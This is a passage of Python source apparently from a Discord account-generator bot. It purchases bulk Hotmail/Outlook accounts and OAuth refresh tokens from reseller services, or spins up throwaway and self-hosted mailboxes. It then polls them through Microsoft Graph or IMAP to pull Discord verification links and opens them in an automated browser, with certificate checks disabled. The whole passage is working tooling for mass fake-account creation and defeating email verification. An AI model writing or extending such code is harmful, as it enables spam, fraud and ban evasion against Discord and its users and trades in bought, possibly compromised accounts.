            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0:
                    return data.get("data", 0.0)
            return 0.0
        except Exception:
            return 0.0
    
    def get_stock(self, mail_type: str = None) -> int:
        """Check stock for a specific mail type"""
        url = f"{self.base_url}/api/mail/getStock"
        params = {}
        if mail_type:
            params["mailType"] = mail_type
        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0:
                    return data.get("data", 0)
            return 0
        except Exception:
            return 0
    
    def buy_email(self) -> dict:
        """Purchase email with retry"""
        if not self.client_key:
            return {"success": False, "error": "Missing client_key"}
        
        balance = self.check_balance()
        if balance <= 0:
            return {"success": False, "error": "Insufficient balance"}
        
        log.success(f"Balance: ${balance:.2f}")
        
        for mail_type in self.mail_types:
            # Checking stock
            stock = self.get_stock(mail_type)
            if stock <= 0:
                continue
            
            # Purchasing email
            
            url = f"{self.base_url}/api/mail/getMail"
            params = {
                "clientKey": self.client_key,
                "mailType": mail_type,
                "quantity": 1
            }
            try:
                resp = self.session.get(url, params=params, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("code") == 0 and data.get("success"):
                        accounts = data.get("data", [])
                        if accounts:
                            parts = accounts[0].split(":")
                            if len(parts) >= 4:
                                log.success(f"✓ Got {mail_type}: {parts[0]}")
                                return {
                                    "success": True,
                                    "email": parts[0],
                                    "password": parts[1],
                                    "token": parts[2],
                                    "uuid": parts[3] if len(parts) > 3 else ""
                                }
                    else:
                        log.warning(f"API error: {data.get('message', 'Unknown')}")
                else:
                    log.warning(f"HTTP {resp.status_code}")
            except Exception as e:
                pass
        
        return {"success": False, "error": "No accounts available"}

# ============================================================================
# ZEUS-X EMAIL API
# ============================================================================

class ZeusXAPI:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://api.zeus-x.ru"
        self.session = requests.Session()
        self.session.verify = False
    
    def check_balance(self):
        try:
            resp = self.session.get(f"{self.base_url}/balance", params={"apikey": self.api_key}, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Code") == 0:
                    return data.get("Balance", 0.0)
            return 0.0
        except:
            return 0.0
    
    def get_stock(self):
        try:
            resp = self.session.get(f"{self.base_url}/instock", timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Code") == 0:
                    stock_list = data.get("Data", [])
                    total_stock = 0
                    for item in stock_list:
                        # Focus on Graph API stock since verification uses Graph API
                        if "GRAPH_API" in item.get("AccountCode", ""):
                            total_stock += item.get("Instock", 0)
                    return total_stock
            return 0
        except:
            return 0
            
    def buy_email(self):
        if not self.api_key:
            return {"success": False, "error": "Missing api_key"}
        
        # We must use a Graph API account code for verification to work.
        mail_types = ["HOTMAIL_TRUSTED_GRAPH_API"]
        last_error = "Unknown Error"
        
        for account_code in mail_types:
            try:
                resp = self.session.get(f"{self.base_url}/purchase", params={"apikey": self.api_key, "accountcode": account_code, "quantity": 1}, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("Code") == 0:
                        accounts = data.get("Data", {}).get("Accounts", [])
                        if accounts:
                            acc = accounts[0]
                            return {
                                "success": True,
                                "email": acc.get("Email", ""),
                                "password": acc.get("Password", ""),
                                "token": acc.get("RefreshToken", ""),
                                "uuid": acc.get("ClientId", "")
                            }
                    # store error and try next
                    last_error = data.get("Message", "Unknown Error")
                else:
                    last_error = f"HTTP {resp.status_code}"
            except Exception as e:
                last_error = str(e)
                
        return {"success": False, "error": last_error}

# ============================================================================
# LEVERAGERS MAIL API
# ============================================================================

from typing import List, Any

class MailAPIException(Exception):
    def __init__(self, message: str, status_code: int = None, response_text: str = None):
        super().__init__(message)
        self.status_code = status_code
        self.response_text = response_text

class MailAPI:
    def __init__(self, api_key: str = None, base_url: str = "https://leveragers.xyz"):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Leveragers-API-Client/3.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.session.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(method, url, **kwargs)
            if response.status_code == 204:
                return {"success": True}
            try:
                data = response.json()
            except json.JSONDecodeError:
                raise MailAPIException(
                    f"Invalid non-JSON response from server", 
                    status_code=response.status_code,
                    response_text=response.text[:500]
                )
            if not response.ok:
                error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                raise MailAPIException(
                    f"API Error: {error_msg}", 
                    status_code=response.status_code,
                    response_text=response.text
                )
            return data
        except requests.RequestException as e:
            raise MailAPIException(f"Connection failed: {str(e)}")
    
    def generate_email(self, domain: str, alias: Optional[str] = None, is_private: bool = False) -> Dict[str, Any]:
        payload = {
            'domain': domain,
            'is_private': is_private
        }
        if alias:
            payload['alias'] = alias
        return self._request('POST', '/api/mail/generate', json=payload)
    
    def get_inbox(self, email_address: str) -> List[Dict[str, Any]]:
        data = self._request('GET', f'/api/mail/inbox/{email_address}')
        return data.get('emails', [])

    def get_private_inbox(self, email_address: str, password: str) -> List[Dict[str, Any]]:
        payload = {
            'email': email_address,
            'password': password
        }
        data = self._request('POST', '/api/mail/private/inbox', json=payload)
        return data.get('emails', [])

    def list_my_emails(self, page: int = 1, per_page: int = 20) -> Dict[str, Any]:
        return self._request('GET', f'/api/mail/list?page={page}&per_page={per_page}')

# ============================================================================
# PUBLIC TEMP INBOX EMAIL API
# ============================================================================

class PublicTempInboxAPI:
    """Public Temp Inbox API - No auth required. Throwaway inboxes on public domains."""
    
    def __init__(self, api_key: str = None, domain: str = None, api_base: str = None):
        self.api_key = api_key
        self.domain = domain or "durudraxon.online"
        self.base_url = api_base or "https://mail.draxono.in"
        # Use httpx client with SSL verification disabled
        self.client = httpx.Client(verify=False, timeout=30, follow_redirects=True)
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.client.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        """Make API request using httpx"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.client.request(method, url, **kwargs)
            try:
                data = response.json()
            except json.JSONDecodeError:
                log.warning(f"Invalid JSON response from Public Temp Inbox: {response.text[:200]}")
                return {"success": False, "error": "Invalid response"}
            
            if not response.is_success:
                if isinstance(data, dict):
                    error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                else:
                    error_msg = f"HTTP {response.status_code}"
                log.warning(f"Public Temp Inbox API error: {error_msg}")
                return {"success": False, "error": error_msg}
            
            return data
        except (httpx.RequestError, httpx.HTTPError) as e:
            log.warning(f"Public Temp Inbox connection error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def generate_email(self, domain: str = None, domains_list: list = None) -> Dict[str, Any]:
        """Generate a temporary email address and claim it with random password"""
        # Use provided domain or select randomly from domains list
        if domains_list and len(domains_list) > 0:
            email_domain = random.choice(domains_list)
        elif domain:
            email_domain = domain
        else:
            email_domain = self.domain
        
        # Generate random username for email and password
        random_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
        
        email = f"{random_user}@{email_domain}"
        
        # Claim the inbox with the email and password
        claim_result = self.claim_inbox(email, random_password)
        
        if claim_result.get("success"):
            return {
                "success": True,
                "email": email,
                "password": random_password,
                "access_code": random_user,
                "inbox_id": email
            }
        
        return claim_result
    
    def claim_inbox(self, email: str, password: str) -> Dict[str, Any]:
        """Claim a public inbox with an email and password"""
        try:
            payload = {
                "email": email,
                "password": password
            }
            result = self._request('POST', f'/api/v1/inbox/{email}/claim', json=payload)
            
            if result.get("success") or not result.get("error"):
                return {
                    "success": True,
                    "email": email,
                    "password": password
                }
            return result
        except Exception as e:
            log.warning(f"Failed to claim inbox: {e}")
            return {"success": False, "error": str(e)}
    
    def get_inbox(self, email: str, password: str = None) -> List[Dict[str, Any]]:
        """Fetch messages from temporary email inbox using POST /api/v1/inbox/{address}"""
        # POST endpoint requires address and password as params
        payload = {
            "address": email,
            "password": password or ""
        }
        result = self._request('POST', f'/api/v1/inbox/{email}', json=payload)
        
        if isinstance(result, list):
            return result
        elif isinstance(result, dict) and result.get('success'):
            return result.get('messages', [])
        return []
    
    def get_message(self, email: str, password: str = None) -> Dict[str, Any]:
        """Fetch messages from inbox using POST /api/v1/inbox/{address} with address and password"""
        payload = {
            "address": email,
            "password": password or ""
        }
        return self._request('POST', f'/api/v1/inbox/{email}', json=payload)

def show_balance_and_stock():
    """Display balance and stock at the top"""
    provider_name = config.get("email_provider", {}).get("name", "").lower()
    
    if provider_name == "hotmail007":
        client_key = config.get("email_provider", {}).get("client_key", "").strip()
        if client_key:
            api = Hotmail007API(client_key)
            balance = api.check_balance()
            if balance > 0:
                log.success(f"Hotmail007 Balance: ${balance:.2f}")
            for mail_type in ["outlook Trusted", "hotmail"]:
                stock = api.get_stock(mail_type)
                if stock > 0:
                    pass
                    
    elif provider_name == "zeusx":
        api_key = config.get("email_provider", {}).get("api_key", "").strip()
        if api_key:
            api = ZeusXAPI(api_key)
            balance = api.check_balance()
            log.success(f"ZeusX Balance: {balance}")
            stock = api.get_stock()
            pass
    
    elif provider_name == "public temp inbox":
        api_key = config.get("email_provider", {}).get("api_key", "").strip()
        if api_key:
            domain = config.get("email_provider", {}).get("domain", "durudraxon.online")
            api_base = config.get("email_provider", {}).get("api_base", "https://mail.draxono.in")
            api = PublicTempInboxAPI(api_key, domain, api_base)
            # PTI ready

# ============================================================================
# MAILCOW EMAIL API
# ============================================================================

class MailcowAPI:
    """Custom Mailcow server integration — creates mailboxes via REST API, reads inbox via IMAP"""
    
    def __init__(self, mailcow_url: str, api_key: str, imap_host: str, domains: list = None):
        self.mailcow_url = mailcow_url.rstrip("/")
        self.api_key = api_key
        self.imap_host = imap_host
        self.session = requests.Session()
        self.session.verify = False
        from urllib3.util.retry import Retry
        from requests.adapters import HTTPAdapter
        retry_strategy = Retry(total=3, backoff_factor=2, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.domains = domains or []
    
    def create_mailbox(self, password: str = None) -> dict:
        domains = self.domains
        if not domains:
            return {"success": False, "error": "No domains configured"}
        
        domain = random.choice(domains)
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        mail_password = password or generate_password(16)
        
        payload = {
            "active": "1",
            "domain": domain,
            "local_part": local_part,
            "name": local_part,
            "password": mail_password,
            "password2": mail_password,
            "quota": "1024",
            "tls_enforce_in": "1",
            "tls_enforce_out": "1",
        }
        
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            try:
                resp = self.session.post(
                    f"{self.mailcow_url}/api/v1/add/mailbox",
                    json=payload,
                    headers={
                        "X-API-Key": self.api_key,
                        "Content-Type": "application/json",
                    },
                    timeout=30,
                )
                
                data = resp.json()
                success = False
                if isinstance(data, list):
                    success = any(r.get("type") == "success" for r in data)
                elif isinstance(data, dict):
                    success = data.get("status") == "success" or data.get("type") == "success"
                
                if success:
                    email_addr = f"{local_part}@{domain}"
                    return {
                        "success": True,
                        "email": email_addr,
                        "password": mail_password,
                        "token": "",
                        "uuid": "",
                    }
            except Exception as e:
                pass
            
            if attempt < max_attempts:
                time.sleep(0.5)
        
        return {"success": False, "error": "All retry attempts failed"}
    
    def buy_email(self) -> dict:
        return self.create_mailbox()

    def read_inbox_imap(self, email_addr: str, password: str, retries: int = 10, delay_sec: int = 5) -> Optional[str]:
        def _try_extract(mail_conn) -> Optional[str]:
            try:
                _, raw_folders = mail_conn.list()
                server_folders = []
                for f in raw_folders:
                    if not f:
                        continue
                    decoded = f.decode() if isinstance(f, bytes) else f
                    token = decoded.strip().rsplit(None, 1)[-1].strip().strip('"')
                    if token and token not in server_folders:
                        server_folders.append(token)
            except Exception:
                server_folders = ["INBOX", "Junk", "Spam"]

            priority = []
            for candidate in ["Junk", "Spam", "INBOX"]:
                for sf in server_folders:
                    if candidate.lower() in sf.lower() and sf not in priority:
                        priority.append(sf)
            for sf in server_folders:
                if sf not in priority:
                    priority.append(sf)

            for folder in priority:
                try:
                    status, _ = mail_conn.select(folder, readonly=True)
                    if status != "OK":
                        continue

                    found_ids = b""
                    for criteria in ("UNSEEN", "ALL"):
                        _, msg_nums = mail_conn.search(None, criteria)
                        if msg_nums and msg_nums[0]:
                            found_ids = msg_nums[0]
                            break

                    if not found_ids:
                        continue

                    msg_ids = found_ids.split()[-5:]

                    for msg_id in reversed(msg_ids):
                        try:
                            _, msg_data = mail_conn.fetch(msg_id, "(RFC822)")
                            if not msg_data or not isinstance(msg_data[0], tuple):
                                continue
                            raw_email = msg_data[0][1]
                            if not isinstance(raw_email, bytes):
                                continue
                        except Exception as fe:
                            continue

                        parsed = email_module.message_from_bytes(raw_email)

                        subject = ""
                        raw_subject = parsed.get("Subject", "")
                        if raw_subject:
                            for part, enc in decode_header(raw_subject):
                                if isinstance(part, bytes):
                                    subject += part.decode(enc or "utf-8", errors="replace")
                                else:
                                    subject += part

                        from_addr = parsed.get("From", "").lower()
                        subject_lower = subject.lower()

                        is_discord = "discord" in from_addr
                        is_verify  = any(w in subject_lower for w in ("verify", "confirm", "email"))

                        if not (is_discord and is_verify):
                            continue


                        body_html = body_text = ""
                        if parsed.is_multipart():
                            for part in parsed.walk():
                                ctype   = part.get_content_type()
                                payload = part.get_payload(decode=True)
                                if payload:
                                    charset = part.get_content_charset() or "utf-8"
                                    text    = payload.decode(charset, errors="replace")
                                    if ctype == "text/html":
                                        body_html += text
                                    elif ctype == "text/plain":
                                        body_text += text
                        else:
                            payload = parsed.get_payload(decode=True)
                            if payload:
                                charset = parsed.get_content_charset() or "utf-8"
                                text    = payload.decode(charset, errors="replace")
                                if parsed.get_content_type() == "text/html":
                                    body_html = text
                                else:
                                    body_text = text

                        combined = body_html + body_text

                        direct = re.search(r'https://discord\.com/verify\?token=[^"\'><\s]+', combined)
                        if direct:
                            return direct.group(0)

                        for m in re.finditer(r'https://(?:click|links)\.discord\.com[^\s"\'<>]+', combined):
                            try:
                                resp = requests.get(m.group(0), allow_redirects=True, verify=False, timeout=10)
                                if "discord.com/verify" in resp.url:
                                    return resp.url
                                bm = re.search(r'https://discord\.com/verify\?token=[^"\'><\s]+', resp.text)
                                if bm:
                                    return bm.group(0)
                            except Exception:
                                pass

                except Exception as e:
                    pass

            return None

        mail = None
        first_attempt = True
        
        for attempt in range(1, retries + 1):
            # Checking inbox via IMAP

            try:
                if mail is None:
                    # Try multiple ports for IMAP (prioritize confirmed working ones)
                    ports_to_try = [993, 143, 9993]
                    mail = None
                    last_error = None
                    connected = False
                    
                    for port in ports_to_try:
                        try:
                            if port == 143:
                                mail = imaplib.IMAP4(self.imap_host, port, timeout=10)
                                mail.starttls()
                            else:
                                mail = imaplib.IMAP4_SSL(self.imap_host, port, timeout=10)
                            
                            mail.login(email_addr, password)
                            connected = True
                            if first_attempt:
                                first_attempt = False
                            break
                        except imaplib.IMAP4.error as imap_error:
                            last_error = imap_error
                            mail = None
                            continue
                        except Exception as port_error:
                            last_error = port_error
                            mail = None
                            continue
                    
                    if not connected:
                        error_msg = str(last_error) if last_error else "Unknown error"
                        
                        if attempt == 1:
                            # Try DNS resolution on first attempt
                            try:
                                import socket
                                ip = socket.gethostbyname(self.imap_host)
                                # Host resolved
                            except socket.gaierror as dns_err:
                                log.error(f"  → DNS resolution failed: {dns_err}")
                        
                        if attempt < retries:
                            time.sleep(delay_sec)
                        continue

                result = _try_extract(mail)
                if result:
                    try:
                        mail.logout()
                    except Exception:
                        pass
                    return result

            except Exception as e:
                log.warning(f"IMAP extraction error: {e}")
                try:
                    if mail:
                        mail.logout()
                except Exception:
                    pass
                mail = None

            if attempt < retries:
                time.sleep(delay_sec)

        if mail:
            try:
                mail.logout()
            except Exception:
                pass

        return None


# ============================================================================
# EMAIL VERIFICATION FUNCTIONS - WORKING VERSION
# ============================================================================

MS_CLIENT_ID = ""

def get_access_token(refresh_token: str, client_id: str, proxy_config: Dict = None) -> Optional[str]:
    """Get Microsoft Graph access token from refresh token"""
    try:
        session = requests.Session()
        session.verify = False
        
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies.update(proxy_dict)
        
        response = session.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "refresh_token": refresh_token,
                "grant_type": "refresh_token",
                "scope": "https://graph.microsoft.com/.default"
            },
            timeout=30
        )
        result = response.json()
        return result.get("access_token")
    except Exception as e:
        return None

def fetch_verification_url(email_data: Dict, timeout: int = 120, proxy_config: Dict = None) -> Optional[str]:
    """Fetch Discord verification URL from email using MS Graph API"""
    refresh_token = email_data.get("token", "")
    client_id = email_data.get("uuid", "") or MS_CLIENT_ID
    
    access_token = get_access_token(refresh_token, client_id, proxy_config)
    if not access_token:
        log.error("Failed to get Graph access token")
        return None
    
    start_time = time.time()
    attempt = 0
    
    session = requests.Session()
    session.verify = False
    
    if proxy_config:
        proxy_dict = get_session_proxy(proxy_config)
        if proxy_dict:
            session.proxies.update(proxy_dict)
    
    while (time.time() - start_time) < timeout:
        attempt += 1
        try:
            response = session.get(
                "https://graph.microsoft.com/v1.0/me/messages",
                headers={"Authorization": f"Bearer {access_token}"},
                params={
                    "$top": 15,
                    "$orderby": "receivedDateTime desc",
                    "$select": "subject,body,from,bodyPreview,receivedDateTime"
                },
                timeout=15
            )
            emails = response.json().get("value", [])
            
            if attempt % 3 == 0:
                elapsed = int(time.time() - start_time)
                log.info(f"Polling inbox for verification link... attempt {attempt}, elapsed {elapsed}s")
            
            for email in emails:
                subject = email.get("subject", "").lower()
                from_addr = email.get("from", {}).get("emailAddress", {}).get("address", "").lower()
                
                # Must be a Discord email verification
                is_verify_email = (
                    ("verify" in subject or "confirm" in subject or "email" in subject) and
                    ("discord" in from_addr or "noreply@discord.com" in from_addr)
                )
                
                if not is_verify_email:
                    continue
                
                body_html = email.get("body", {}).get("content", "")
                
                # First priority: Direct discord.com/verify link
                verify_pattern = r'https://(?:[\w-]+\.)*discord\.com/verify\?token=[^"\'\>\s]+'
                direct_match = re.search(verify_pattern, body_html)
                if direct_match:
                    log.success("Found verify link in email!")
                    return direct_match.group(0)
                
                # Second priority: Click tracking links
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+',
                    r'https://(?:[\w-]+\.)*discord\.com/verify\?token=[^"\'\>\s]+'
                ]
                
                for pat in click_patterns:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            resp = session.get(url, allow_redirects=True, timeout=10)
                            final_url = resp.url
                            
                            if "discord.com/verify" in final_url:
                                log.success("Found verify link via redirect!")
                                return final_url
                            
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success("Found verify link in response body!")
                                return verify_in_body.group(0)
                        except:
                            pass
                
                log.warning("Discord email found but no valid verify link")
                    
        except Exception as e:
            log.warning(f"Graph API error: {e}")
        
        time.sleep(3)
    
    log.warning("Verification email not found after timeout")
    return None

async def verify_email_with_url(browser, verify_url: str, token: str, timeout: int = 60) -> bool:
    """Open verification URL and confirm email verification"""
    if not verify_url:
        return False
    
# Opening verification link
    
    try:
        page = await browser.get(verify_url)
        await asyncio.sleep(5)
        
        # Wait for verification to complete
        for _ in range(timeout // 5):
            await asyncio.sleep(5)
            verified, _ = check_email_verified_api(token)
            if verified:
                return True
        
        return True  # Assume success if page loaded
    except Exception as e:
        log.warning(f"Error opening verification URL: {e}")
        return False

async def verify_email_hotmail007(email: str, refresh_token: str, client_id: str, browser, token: str, proxy_config: Dict = None, timeout: int = 120) -> bool:
    """Fetch and click Discord verification URL from Hotmail007 email"""
    
    email_data = {
        "email": email,
        "token": refresh_token,
        "uuid": client_id
    }
    
    verify_url = fetch_verification_url(email_data, timeout, proxy_config)
    
    if verify_url:
        return await verify_email_with_url(browser, verify_url, token)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_leveragers(email: str, password: str, browser, token: str, api_key: str, timeout: int = 120) -> bool:
    api = MailAPI(api_key=api_key)
    start_time = time.time()
    
    while (time.time() - start_time) < timeout:
        try:
            if password:
                inbox = api.get_private_inbox(email, password)
            else:
                inbox = api.get_inbox(email)
            
            for msg in inbox:
                subject = msg.get("subject", "").lower()
                if "verify" in subject or "confirm" in subject or "discord" in subject or "email" in subject:
                    body = msg.get("body", "") or msg.get("html", "") or msg.get("text", "")
                    
                    verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                    direct_match = re.search(verify_pattern, body)
                    if direct_match:
                        verify_url = direct_match.group(0)
                        log.success("Found verify link in email!")
                        return await verify_email_with_url(browser, verify_url, token)
        except Exception:
            pass
        
        await asyncio.sleep(5)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_public_temp_inbox(email: str, password: str, browser, token: str, api_key: str, domain: str = None, api_base: str = None, timeout: int = 120) -> bool:
    """Fetch and click Discord verification URL from Public Temp Inbox email"""
    # Extract domain from email or use provided domain
    email_domain = domain or (email.split('@')[1] if '@' in email else "durudraxon.online")
    api = PublicTempInboxAPI(api_key=api_key, domain=email_domain, api_base=api_base)
    start_time = time.time()
    
    while (time.time() - start_time) < timeout:
        try:
            # Fetch inbox messages
            inbox = api.get_inbox(email, password)
            
            # inbox is a list of email objects
            if not isinstance(inbox, list):
                inbox = []
            
            for msg in inbox:
                subject = msg.get("subject", "").lower()
                from_addr = msg.get("from", "").lower()
                
                # Check if it's a Discord verification email
                is_verify_email = (
                    ("verify" in subject or "confirm" in subject or "email" in subject or "discord" in subject) and
                    ("discord" in from_addr or "noreply@discord.com" in from_addr)
                )
                
                if not is_verify_email:
                    continue
                
                # Public Temp Inbox returns both html and text
                body = msg.get("html", "") or msg.get("text", "") or msg.get("body", "") or msg.get("content", "")
                
                # First priority: Direct discord.com/verify link
                verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                direct_match = re.search(verify_pattern, body)
                if direct_match:
                    verify_url = direct_match.group(0)
                    log.success("Found verify link in email!")
                    return await verify_email_with_url(browser, verify_url, token)
                
                # Second priority: Click tracking links
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+'
                ]
                
                for pat in click_patterns:
                    for m in re.finditer(pat, body):
                        url = m.group(0)
                        try:
                            session = requests.Session()
                            session.verify = False
                            resp = session.get(url, allow_redirects=True, timeout=10)
                            final_url = resp.url
                            
                            if "discord.com/verify" in final_url:
                                log.success("Found verify link via redirect!")
                                return await verify_email_with_url(browser, final_url, token)
                            
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success("Found verify link in response body!")
                                return await verify_email_with_url(browser, verify_in_body.group(0), token)
                        except:
                            pass
                
                log.warning("Discord email found but no valid verify link")
        
        except Exception as e:
            pass
        
        await asyncio.sleep(5)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_mailcow(email_addr: str, password: str, browser, token: str, config: dict, timeout: int = 120) -> bool:
    """Fetch and click Discord verification URL from Mailcow inbox via IMAP"""
    
    # Check both old and new config structures
    mc_config = config.get("email_providers", {}).get("mailcow", {})
    if not mc_config:
        mc_config = config.get("email_api", {}).get("mailcow", {})
    
    mailcow_url = mc_config.get("mailcow_url", "").strip()
    api_key = mc_config.get("api_key", "").strip()
    imap_host = mc_config.get("imap_host", "").strip()
    domains = mc_config.get("domains", [])
    
    api = MailcowAPI(mailcow_url, api_key, imap_host, domains)
    retries = max(1, timeout // 5)
    
    verify_url = await asyncio.to_thread(api.read_inbox_imap, email_addr, password, retries, 5)
    
    if verify_url:
        return await verify_email_with_url(browser, verify_url, token)
    
    log.warning("Verification email not found after timeout")
    return False

# ============================================================================
# EMAIL PROVIDER SELECTOR
# ============================================================================

def get_hotmail007_email(config: dict) -> tuple:
    # Check new email_providers structure first, then old email_provider
    h_config = config.get("email_providers", {}).get("hotmail007", {})
    if not h_config:
        h_config = config.get("email_provider", {})
    
    client_key = h_config.get("client_key", "").strip()
    
    if not client_key:
        log.warning("No Hotmail007 client_key configured")
        return None, None, None, None
    
    api = Hotmail007API(client_key)
    result = api.buy_email()
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            result.get("token", ""),
            result.get("uuid", "")
        )
    else:
        log.error(f"Failed to purchase email: {result.get('error', 'Unknown')}")
        return None, None, None, None

def get_zeusx_email(config: dict) -> tuple:
    # Check new email_providers structure first, then old email_provider
    z_config = config.get("email_providers", {}).get("zeusx", {})
    if not z_config:
        z_config = config.get("email_provider", {})
    
    api_key = z_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No ZeusX api_key configured")
        return None, None, None, None
    api = ZeusXAPI(api_key)
    result = api.buy_email()
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            result.get("token", ""),
            result.get("uuid", "")
        )
    else:
        log.error(f"Failed to purchase email: {result.get('error', 'Unknown')}")
        return None, None, None, None

def get_leveragers_email(config: dict) -> tuple:
    # Check new email_providers structure first, then old email_provider
    l_config = config.get("email_providers", {}).get("leveragers", {})
    if not l_config:
        l_config = config.get("email_provider", {})
    
    api_key = l_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No Leveragers api_key configured")
        return None, None, None, None
    api = MailAPI(api_key=api_key)
    try:
        domain = l_config.get("domain", "leveragers.xyz")
        res = api.generate_email(domain, is_private=True)
        if "email" in res:
            return (res.get("email"), res.get("password"), "", "")
        else:
            log.error(f"Leveragers error: {res}")
            return None, None, None, None
    except Exception as e:
        log.error(f"Failed to generate leveragers email: {e}")
        return None, None, None, None

def get_public_temp_inbox_email(config: dict) -> tuple:
    # Check new email_providers structure first, then old email_provider
    pti_config = config.get("email_providers", {}).get("public_temp_inbox", {})
    if not pti_config:
        pti_config = config.get("email_providers", {}).get("draxono", {})
    if not pti_config:
        pti_config = config.get("email_provider", {})
    
    api_key = pti_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No Public Temp Inbox api_key configured")
        return None, None, None, None
    domain = pti_config.get("domain", "durudraxon.online")
    domains_list = pti_config.get("domains", [domain])
    api_base = pti_config.get("api_base", "https://mail.draxono.in")
    api = PublicTempInboxAPI(api_key=api_key, domain=domain, api_base=api_base)
    try:
        res = api.generate_email(domain=None, domains_list=domains_list)
        
        # Check if response has success flag or email field
        if res.get("success") and res.get("email"):
            return (
                res.get("email"),
                res.get("password", ""),
                res.get("access_code", res.get("token", "")),
                res.get("inbox_id", "")
            )
        elif res.get("email"):  # Handle case where success flag might not be set
            return (
                res.get("email"),
                res.get("password", ""),
                res.get("access_code", res.get("token", "")),
                res.get("inbox_id", "")
            )
        else:
            error_msg = res.get("error", "Failed to generate email")
            log.error(f"Public Temp Inbox error: {error_msg}")
            return None, None, None, None
    except Exception as e:
        log.error(f"Failed to generate Public Temp Inbox email: {e}")
        return None, None, None, None

def get_mailcow_email(config: dict) -> tuple:
    # Check both old and new config structures
    mc_config = config.get("email_providers", {}).get("mailcow", {})
    if not mc_config:
        mc_config = config.get("email_api", {}).get("mailcow", {})
    
    mailcow_url = mc_config.get("mailcow_url", "").strip()
    api_key = mc_config.get("api_key", "").strip()
    imap_host = mc_config.get("imap_host", "").strip()
    domains = mc_config.get("domains", [])
    
    if not mailcow_url or not api_key:
        log.warning(f"Mailcow config incomplete: url={bool(mailcow_url)}, key={bool(api_key)}")
        return None, None, None, None
    
    api = MailcowAPI(mailcow_url, api_key, imap_host, domains)
    mail_password = generate_form_password(10)
    result = api.create_mailbox(password=mail_password)
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            "",
            ""
        )
    return None, None, None, None

def get_email_from_provider(config: dict) -> tuple:
    # Check provider_selection setting first
    provider_selection = config.get("provider_selection", "").lower().strip()
    
    if provider_selection == "mailcow":
        # Using Mailcow provider
        email, password, token, uuid = get_mailcow_email(config)
        if email:
            return email, password, token, uuid, "mailcow"
    
    # Fallback to email_api.mailcow if enabled
    mailcow_enabled = config.get("email_api", {}).get("mailcow", {}).get("enabled", False)
    if mailcow_enabled and not provider_selection:
        # Using Mailcow provider
        email, password, token, uuid = get_mailcow_email(config)
        if email:
            return email, password, token, uuid, "mailcow"
            
    provider_name = config.get("email_provider", {}).get("name", "").lower()
    
    if provider_selection == "hotmail007" or provider_name == "hotmail007":
        # Using Hotmail007
        email, password, token, uuid = get_hotmail007_email(config)
        if email:
            return email, password, token, uuid, "hotmail007"
            
    elif provider_selection == "zeusx" or provider_name == "zeusx":
        # Using ZeusX
        email, password, token, uuid = get_zeusx_email(config)
        if email:
            return email, password, token, uuid, "zeusx"
            
    elif provider_selection == "leveragers" or provider_name == "leveragers":
        # Using Leveragers
        email, password, token, uuid = get_leveragers_email(config)
        if email:
            return email, password, token, uuid, "leveragers"
    
    elif provider_selection in ["public temp inbox", "draxono"] or provider_name == "public temp inbox":
        # Using PTI
        email, password, token, uuid = get_public_temp_inbox_email(config)
        if email:
            return email, password, token, uuid, "public temp inbox"
    
    log.error("No email provider available or all failed")
    return None, None, None, None, None


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_username() -> str:
    adjectives = ['Cool', 'Epic', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master']
